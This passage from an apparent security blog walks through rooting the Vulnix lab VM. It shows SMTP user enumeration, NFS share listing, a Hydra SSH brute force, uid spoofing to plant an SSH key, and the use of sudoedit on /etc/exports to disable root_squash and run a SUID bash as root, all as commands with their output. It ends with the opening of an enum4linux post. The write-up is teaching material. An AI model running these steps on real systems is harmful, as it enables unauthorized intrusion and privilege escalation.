<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )
</span><span class='line'>
</span><span class='line'>Usage: smtp-user-enum.pl [options] ( -u username | -U file-of-usernames ) ( -t host | -T file-of-targets )
</span><span class='line'>
</span><span class='line'>options are:
</span><span class='line'>        -m n     Maximum number of processes (default: 5)
</span><span class='line'>  -M mode  Method to use for username guessing EXPN, VRFY or RCPT (default: VRFY)
</span><span class='line'>  -u user  Check if user exists on remote system
</span><span class='line'>  -f addr  MAIL FROM email address.  Used only in "RCPT TO" mode (default: user@example.com)
</span><span class='line'>        -D dom   Domain to append to supplied user list to make email addresses (Default: none)
</span><span class='line'>                 Use this option when you want to guess valid email addresses instead of just usernames
</span><span class='line'>                 e.g. "-D example.com" would guess foo@example.com, bar@example.com, etc.  Instead of 
</span><span class='line'>                      simply the usernames foo and bar.
</span><span class='line'>  -U file  File of usernames to check via smtp service
</span><span class='line'>  -t host  Server host running smtp service
</span><span class='line'>  -T file  File of hostnames running the smtp service
</span><span class='line'>  -p port  TCP port on which smtp service runs (default: 25)
</span><span class='line'>  -d       Debugging output
</span><span class='line'>  -t n     Wait a maximum of n seconds for reply (default: 5)
</span><span class='line'>  -v       Verbose
</span><span class='line'>  -h       This help message
</span><span class='line'>
</span><span class='line'>Also see smtp-user-enum-user-docs.pdf from the smtp-user-enum tar ball.
</span><span class='line'>
</span><span class='line'>Examples:
</span><span class='line'>
</span><span class='line'>$ smtp-user-enum.pl -M VRFY -U users.txt -t 10.0.0.1
</span><span class='line'>$ smtp-user-enum.pl -M EXPN -u admin1 -t 10.0.0.1
</span><span class='line'>$ smtp-user-enum.pl -M RCPT -U users.txt -T mail-server-ips.txt
</span><span class='line'>$ smtp-user-enum.pl -M EXPN -D example.com -U users.txt -t 10.0.0.1</span></code></pre></td></tr></table></div></figure>


<p>I created a file named users.txt with some usernames to try, and fed it to the script:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# smtp-user-enum -U users.txt -t 192.168.217.142
</span><span class='line'>Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )
</span><span class='line'>
</span><span class='line'> ----------------------------------------------------------
</span><span class='line'>|                   Scan Information                       |
</span><span class='line'> ----------------------------------------------------------
</span><span class='line'>
</span><span class='line'>Mode ..................... VRFY
</span><span class='line'>Worker Processes ......... 5
</span><span class='line'>Usernames file ........... users.txt
</span><span class='line'>Target count ............. 1
</span><span class='line'>Username count ........... 6
</span><span class='line'>Target TCP port .......... 25
</span><span class='line'>Query timeout ............ 5 secs
</span><span class='line'>Target domain ............ 
</span><span class='line'>
</span><span class='line'>######## Scan started at Tue Jun 20 09:29:30 2017 #########
</span><span class='line'>192.168.217.142: root exists
</span><span class='line'>192.168.217.142: vulnix exists
</span><span class='line'>192.168.217.142: user exists
</span><span class='line'>192.168.217.142: postmaster exists
</span><span class='line'>192.168.217.142: mail exists
</span><span class='line'>######## Scan completed at Tue Jun 20 09:29:30 2017 #########
</span><span class='line'>5 results.
</span><span class='line'>
</span><span class='line'>6 queries in 1 seconds (6.0 queries / sec)</span></code></pre></td></tr></table></div></figure>


<p>You can see that this is a pretty cool script that can help you enumerate users pretty fast, and now we know more valid user accounts on the system. You can also use it to find valid email addresses instead of accounts, by using the <em>-D</em> option. I tried a few examples, but got no hits.</p>

<p>Moving on, ports 512-514 are fore the old r-utilities, and if misconfigured, could allow remote access to the host. But in this case, the system asked me for root&rsquo;s SSH password, so I couldn&rsquo;t exploit them.</p>

<h3>Exploit NFS</h3>

<p>We&rsquo;ve done some preliminary enumeration on the target, now it&rsquo;s time to return to the results of the Nmap scan. We&rsquo;ve identified the fact that NFS is running on the Vulnix host. I confirmed it with the use of <em>rpcinfo</em>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>rpcinfo -p 192.168.217.142
</span><span class='line'>   program vers proto   port  service
</span><span class='line'>    100000    4   tcp    111  portmapper
</span><span class='line'>    100000    3   tcp    111  portmapper
</span><span class='line'>    100000    2   tcp    111  portmapper
</span><span class='line'>    100000    4   udp    111  portmapper
</span><span class='line'>    100000    3   udp    111  portmapper
</span><span class='line'>    100000    2   udp    111  portmapper
</span><span class='line'>    100024    1   udp  39427  status
</span><span class='line'>    100024    1   tcp  42309  status
</span><span class='line'>    100003    2   tcp   2049  nfs
</span><span class='line'>    100003    3   tcp   2049  nfs
</span><span class='line'>    100003    4   tcp   2049  nfs
</span><span class='line'>    100227    2   tcp   2049
</span><span class='line'>    100227    3   tcp   2049
</span><span class='line'>    100003    2   udp   2049  nfs
</span><span class='line'>    100003    3   udp   2049  nfs
</span><span class='line'>    100003    4   udp   2049  nfs
</span><span class='line'>    100227    2   udp   2049
</span><span class='line'>    100227    3   udp   2049
</span><span class='line'>    100021    1   udp  39258  nlockmgr
</span><span class='line'>    100021    3   udp  39258  nlockmgr
</span><span class='line'>    100021    4   udp  39258  nlockmgr
</span><span class='line'>    100021    1   tcp  34418  nlockmgr
</span><span class='line'>    100021    3   tcp  34418  nlockmgr
</span><span class='line'>    100021    4   tcp  34418  nlockmgr
</span><span class='line'>    100005    1   udp  34638  mountd
</span><span class='line'>    100005    1   tcp  52581  mountd
</span><span class='line'>    100005    2   udp  42603  mountd
</span><span class='line'>    100005    2   tcp  53226  mountd
</span><span class='line'>    100005    3   udp  49704  mountd
</span><span class='line'>    100005    3   tcp  47770  mountd</span></code></pre></td></tr></table></div></figure>


<p>If NFS wasn&rsquo;t properly configured, we might have access to shares we wouldn&rsquo;t otherwise be allowed to. There are a couple of ways to list the shares, and I&rsquo;m going to show here some of them. Th easiest way is from the command line, with the <code>showmount -e</code> command:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# showmount -e 192.168.217.142
</span><span class='line'>Export list for 192.168.217.142:
</span><span class='line'>/home/vulnix *</span></code></pre></td></tr></table></div></figure>


<p>Good news! The vulnix home directory is being shared with no restrictions. Before going there, let&rsquo;s see how we can get the same information with Nmap:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -sV -p111 --script=nfs-showmount 192.168.217.142
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.40 ( https://nmap.org ) at 2017-06-21 06:00 EDT
</span><span class='line'>Nmap scan report for 192.168.217.142
</span><span class='line'>Host is up (0.00027s latency).
</span><span class='line'>PORT    STATE SERVICE VERSION
</span><span class='line'>111/tcp open  rpcbind 2-4 (RPC #100000)
</span><span class='line'>| nfs-showmount: 
</span><span class='line'>|_  /home/vulnix *
</span><span class='line'>| rpcinfo: 
</span><span class='line'>|   program version   port/proto  service
</span><span class='line'>|   100000  2,3,4        111/tcp  rpcbind
</span><span class='line'>|   100000  2,3,4        111/udp  rpcbind
</span><span class='line'>|   100003  2,3,4       2049/tcp  nfs
</span><span class='line'>|   100003  2,3,4       2049/udp  nfs
</span><span class='line'>|   100005  1,2,3      47770/tcp  mountd
</span><span class='line'>|   100005  1,2,3      49704/udp  mountd
</span><span class='line'>|   100021  1,3,4      34418/tcp  nlockmgr
</span><span class='line'>|   100021  1,3,4      39258/udp  nlockmgr
</span><span class='line'>|   100024  1          39427/udp  status
</span><span class='line'>|   100024  1          42309/tcp  status
</span><span class='line'>|   100227  2,3         2049/tcp  nfs_acl
</span><span class='line'>|_  100227  2,3         2049/udp  nfs_acl</span></code></pre></td></tr></table></div></figure>


<p>We can also use the <em>auxiliary/scanner/nfs/nfsmount</em> Metasploit module:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf auxiliary(nfsmount) &gt; run
</span><span class='line'>
</span><span class='line'>[+] 192.168.217.142:111   - 192.168.217.142 NFS Export: /home/vulnix [*]
</span><span class='line'>[*] Scanned 1 of 1 hosts (100% complete)
</span><span class='line'>[*] Auxiliary module execution completed</span></code></pre></td></tr></table></div></figure>


<p>I mounted the share locally to see what&rsquo;s there. The <em>nolock</em> option disables file locking and it&rsquo;s sometimes required for older NFS servers.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:/mnt# mkdir nfs
</span><span class='line'>root@kali:/mnt# mount -t nfs -o nolock 192.168.217.142:/home/vulnix /mnt/nfs</span></code></pre></td></tr></table></div></figure>


<p>However, when I tried to access the newly mounted share, I got permission denied errors. I couldn&rsquo;t <em>chmod</em> or do anything else. After some reading on the interwebz, it seems the likely cause is the <a href="https://www.centos.org/docs/5/html/Deployment_Guide-en-US/s1-nfs-server-config-exports.html">root_squash</a> option, that nullifies the root privileges of the clients accessing the share, and instead gives them the user ID of the nobody user. It seems to be enabled by default on modern NFS implementations, and you can read more about it <a href="http://www.techrepublic.com/article/working-with-nfs/">here</a>.</p>

<p>After some more digging through the interwebz, I found an <a href="https://www.pentestpartners.com/security-blog/using-nfsshell-to-compromise-older-environments/">interesting article about nfsshell</a>, which is a userspace NFS client shell. I downloaded it from its <a href="https://github.com/NetDirect/nfsshell">Github page</a>, and to compile I had to install the following <a href="https://www.phillips321.co.uk/2015/09/15/nfsshell-on-kali-linux-2-0/">dependencies</a>: <code>apt-get install libreadline-dev libncurses5-dev</code>. Afterwards, I ran <em>make</em> and it compiled fine. Here are its options:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nfs&gt; help
</span><span class='line'>host &lt;host&gt; - set remote host name
</span><span class='line'>uid [&lt;uid&gt; [&lt;secret-key&gt;]] - set remote user id
</span><span class='line'>gid [&lt;gid&gt;] - set remote group id
</span><span class='line'>cd [&lt;path&gt;] - change remote working directory
</span><span class='line'>lcd [&lt;path&gt;] - change local working directory
</span><span class='line'>cat &lt;filespec&gt; - display remote file
</span><span class='line'>ls [-l] &lt;filespec&gt; - list remote directory
</span><span class='line'>get &lt;filespec&gt; - get remote files
</span><span class='line'>df - file system information
</span><span class='line'>rm &lt;file&gt; - delete remote file
</span><span class='line'>ln &lt;file1&gt; &lt;file2&gt; - link file
</span><span class='line'>mv &lt;file1&gt; &lt;file2&gt; - move file
</span><span class='line'>mkdir &lt;dir&gt; - make remote directory
</span><span class='line'>rmdir &lt;dir&gt; - remove remote directory
</span><span class='line'>chmod &lt;mode&gt; &lt;file&gt; - change mode
</span><span class='line'>chown &lt;uid&gt;[.&lt;gid&gt;] &lt;file&gt; -  change owner
</span><span class='line'>put &lt;local-file&gt; [&lt;remote-file&gt;] - put file
</span><span class='line'>mount [-upTU] [-P port] &lt;path&gt; - mount file system
</span><span class='line'>umount - umount remote file system
</span><span class='line'>umountall - umount all remote file systems
</span><span class='line'>export - show all exported file systems
</span><span class='line'>dump - show all remote mounted file systems
</span><span class='line'>status - general status report
</span><span class='line'>help - this help message
</span><span class='line'>quit - its all in the name
</span><span class='line'>bye - good bye
</span><span class='line'>handle [&lt;handle&gt;] - get/set directory file handle
</span><span class='line'>mknod &lt;name&gt; [b/c major minor] [p] - make device</span></code></pre></td></tr></table></div></figure>


<p>From my reading about NFS and root squashing, it seems that knowing the uid of the share&rsquo;s owner would allow mounting the share as that user and bypassing the access denied errors that I got as root. Because the share is the home folder of the vulnix user, we need to know the uid for that particular user account. But we need local access to the machine to find that out. Well, we did get some usernames from the enumeration stage, so we probably have to attempt a bruteforce attack. From all the discovered usernames, I only kept the user and vulnix ones, because the rest were users for various services on the system. And then I ran Hydra with the recommended task number for SSH:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/vulnix-hydra.png" title="hydra" alt="letmein"></p>

<p>Hydra found the password for user pretty quickly. I logged in as user, but didn&rsquo;t find anything out of the ordinary. However, I was able to get the uid for the vulnix account:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@vulnix:~$ id vulnix
</span><span class='line'>uid=2008(vulnix) gid=2008(vulnix) groups=2008(vulnix)</span></code></pre></td></tr></table></div></figure>


<p>I went back to nfsshell and made the changes:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nfs&gt; host 192.168.217.142
</span><span class='line'>Using a privileged port (1023)
</span><span class='line'>Open 192.168.217.142 (192.168.217.142) TCP
</span><span class='line'>nfs&gt; uid 2008
</span><span class='line'>nfs&gt; gid 2008
</span><span class='line'>nfs&gt; status
</span><span class='line'>User id      : 2008
</span><span class='line'>Group id     : 2008
</span><span class='line'>Remote host  : `192.168.217.142'
</span><span class='line'>Transfer size: 0</span></code></pre></td></tr></table></div></figure>


<p>Now I was able to access the share:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nfs&gt; ls -l
</span><span class='line'>drwxr-x---  2     2008  2008      4096  Sep  2  2012  .
</span><span class='line'>drwxr-x---  2     2008  2008      4096  Sep  2  2012  ..
</span><span class='line'>drwxr-x---  2     2008  2008      4096  Sep  2  2012  .bash_logout
</span><span class='line'>drwxr-x---  2     2008  2008      4096  Sep  2  2012  .bashrc
</span><span class='line'>drwxr-x---  2     2008  2008      4096  Sep  2  2012  .profile</span></code></pre></td></tr></table></div></figure>


<p>Since this is vulnix&rsquo;s home directory, we can put an SSH key in here to allow remote access. I tried the next steps through nfsshell, but I was limited in the commands I could run. So I created a local vulnix user on my machine, and assigned it the uid 2008: <code>root@kali:~# useradd vulnix -u 2008</code>. Then I generated an SSH key pair from this account:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# su vulnix
</span><span class='line'>$ id
</span><span class='line'>uid=2008(vulnix) gid=2008(vulnix) groups=2008(vulnix)
</span><span class='line'>$ cd /tmp
</span><span class='line'>$ ssh-keygen
</span><span class='line'>Generating public/private rsa key pair.
</span><span class='line'>Enter file in which to save the key (/home/vulnix/.ssh/id_rsa): vulnix
</span><span class='line'>Enter passphrase (empty for no passphrase): 
</span><span class='line'>Enter same passphrase again: 
</span><span class='line'>Your identification has been saved in vulnix.
</span><span class='line'>Your public key has been saved in vulnix.pub.
</span><span class='line'>The key fingerprint is:
</span><span class='line'>SHA256:P6FAPt9R/0TbOTtQUhk8SiBUlgAtINciO0mUmr2Nrp4 vulnix@kali
</span><span class='line'>The key's randomart image is:
</span><span class='line'>+---[RSA 2048]----+
</span><span class='line'>|  .o.oo.++o+o .oo|
</span><span class='line'>|   +o. o .o. ..+ |
</span><span class='line'>|  = + o .   o...o|
</span><span class='line'>| o = o     . oo.+|
</span><span class='line'>|    = + S o  ..+o|
</span><span class='line'>|   o . + + o  .oo|
</span><span class='line'>|  .     o +    o.|
</span><span class='line'>|  ..       .    .|
</span><span class='line'>|.E.              |
</span><span class='line'>+----[SHA256]-----+</span></code></pre></td></tr></table></div></figure>


<p>I now navigated without problems to the NFS share, created a .ssh directory and copied the contents of the public key to <em>authorized_keys</em>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ cat /tmp/vulnix.pub &gt; .ssh/authorized_keys
</span><span class='line'>$ cat .ssh/authorized_keys
</span><span class='line'>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuO5LOA1EIJeaFJHHic7NRNIUvOhBApq7CSu7PAM/THU4hngoZ4kglgFC9QdbsfQsRWLHsDmNcAAGLzIKwkLYXWYanBK/7xdmRmtGf0Sr32zZ4NaXP9B228fjUu5LSi42X/9HcfL9QdfXuB336OvXo43sDzLifrzoiBzlviZV55+uVd+/hI0GCRE3Yi9JrLs1A6NhuHq8xtRLJURhuGwoouA2tGZ+6fSr7t23bC1emBnyUiy2hu/4oS9tLvvptPv1Md9E+Ire6XMjZzCJufcSqiMVrVefnWv5j460TjHhKP7aq23nbzlxMqkZ8r9ovm5KW0UWWWyVPkOFSxPgFEaRr vulnix@kali</span></code></pre></td></tr></table></div></figure>


<p>And I was able to login with the key: <code>ssh -i /tmp/vulnix <a href="&#x6d;&#97;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#118;&#117;&#x6c;&#x6e;&#x69;&#120;&#64;&#49;&#x39;&#x32;&#46;&#49;&#x36;&#x38;&#46;&#x32;&#49;&#55;&#x2e;&#x31;&#52;&#50;">&#118;&#117;&#x6c;&#110;&#x69;&#x78;&#64;&#49;&#57;&#50;&#46;&#x31;&#x36;&#x38;&#x2e;&#50;&#x31;&#x37;&#x2e;&#x31;&#x34;&#50;</a></code>. After some enumeration, I discovered that the vulnix user can edit <code>/etc/exports</code> with sudo privileges:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>vulnix@vulnix:~$ sudo -l
</span><span class='line'>Matching 'Defaults' entries for vulnix on this host:
</span><span class='line'>    env_reset,
</span><span class='line'>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
</span><span class='line'>
</span><span class='line'>User vulnix may run the following commands on this host:
</span><span class='line'>    (root) sudoedit /etc/exports, (root) NOPASSWD: sudoedit /etc/exports</span></code></pre></td></tr></table></div></figure>


<p>This is wonderful news. First of all, we need to disable <em>root_squash</em>. Then we can mount the root directory and read the flag, or we can leave a shell binary in vulnix&rsquo;s home directory, and run it later with root privileges. Let&rsquo;s do just that! I disabled root squashing with <code>/home/vulnix    *(rw,no_root_squash)</code>. Then I copied the bash executable:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>vulnix@vulnix:~$ cp /bin/bash /home/vulnix/
</span><span class='line'>vulnix@vulnix:~$ ls -l
</span><span class='line'>total 900
</span><span class='line'>-rwxr-xr-x 1 vulnix vulnix 920788 Jun 21 14:46 bash</span></code></pre></td></tr></table></div></figure>


<p>For the NFS configuration changes to take effect, I needed to make the NFS service to reload its configuration file or restart it, but I didn&rsquo;t have permissions to do that. So I rebooted the machine (but unmounted the share first). After rebooting, I mounted the share again, navigated to it as root with no problems, and changed permissions on the bash shell to make it SUID: <code>chmod 4777 bash</code> (I also copied it again as root).</p>

<p>From the SSH, I verified it as the vulnix user:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>vulnix@vulnix:~$ ls -l bash
</span><span class='line'>-rwsrwxrwx 1 root root 920788 Jun 21 15:34 bash</span></code></pre></td></tr></table></div></figure>


<p>Finally, I ran the shell while preserving its permissions:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>vulnix@vulnix:~$ ./bash -p
</span><span class='line'>bash-4.2# whoami
</span><span class='line'>root
</span><span class='line'>bash-4.2# cat /root/trophy.txt
</span><span class='line'>cc614640424f5bd60ce5d5264899c3be</span></code></pre></td></tr></table></div></figure>


<p>Not done yet, I cracked the MD5 hash to reveal the name of the l33t name of the author: Reb00tu53r. This was a fun one!</p>

<p><strong>Learn more</strong></p>

<ul>
<li><p><a href="https://www.phillips321.co.uk/2015/09/15/nfsshell-on-kali-linux-2-0/">NFSShell on Kali Linux</a></p></li>
<li><p><a href="https://www.pentestpartners.com/security-blog/using-nfsshell-to-compromise-older-environments/">Using nfsshell to compromise older environments</a></p></li>
<li><p><a href="http://www.techrepublic.com/article/working-with-nfs/">Working with NFS</a></p></li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _____________________________________
</span><span class='line'>/ Q: What do you call a half-dozen    \
</span><span class='line'>| Indians with Asian flu? A: Six sick |
</span><span class='line'>\ Sikhs (sic).                        /
</span><span class='line'> -------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[enum4linux - Kali Linux tools]]></title>
    <link href="http://chousensha.github.io/blog/2017/06/19/enum4linux-kali-linux-tools/"/>
    <updated>2017-06-19T10:08:57-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/06/19/enum4linux-kali-linux-tools</id>
    <content type="html"><![CDATA[<p><strong>Objective</strong>: enumerate shares on a target and gather as much information as possible. enum4linux is a Perl script that can get the job done.</p>

<p>Homepage: <a href="https://labs.portcullis.co.uk/tools/enum4linux/">https://labs.portcullis.co.uk/tools/enum4linux/</a></p>

<!-- more -->


<h2>enum4linux description</h2>

<blockquote><p>A Linux alternative to enum.exe for enumerating data from Windows and Samba hosts.</p>

<p>Enum4linux is a tool for enumerating information from Windows and Samba systems. It attempts to offer similar
functionality to enum.exe formerly available from www.bindview.com.</p>

<p>It is written in Perl and is basically a wrapper around the Samba tools smbclient, rpclient, net and nmblookup.</p>

<p>Key features:</p>

<ul>
<li><p>RID cycling (When RestrictAnonymous is set to 1 on Windows 2000)</p></li>
<li><p>User listing (When RestrictAnonymous is set to 0 on Windows 2000)</p></li>
<li><p>Listing of group membership information</p></li>
<li><p>Share enumeration</p></li>
<li><p>Detecting if host is in a workgroup or a domain</p></li>
<li><p>Identifying the remote operating system</p></li>
<li><p>Password policy retrieval (using polenum)</p></li>
</ul>
</blockquote>

<h2>enum4linux options</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>num4linux
</span><span class='line'>enum4linux v0.8.9 (http://labs.portcullis.co.uk/application/enum4linux/)
</span><span class='line'>Copyright (C) 2011 Mark Lowe (mrl@portcullis-security.com)
</span><span class='line'>
</span><span class='line'>Simple wrapper around the tools in the samba package to provide similar 
</span><span class='line'>functionality to enum.exe (formerly from www.bindview.com).  Some additional 
</span><span class='line'>features such as RID cycling have also been added for convenience.
</span><span class='line'>
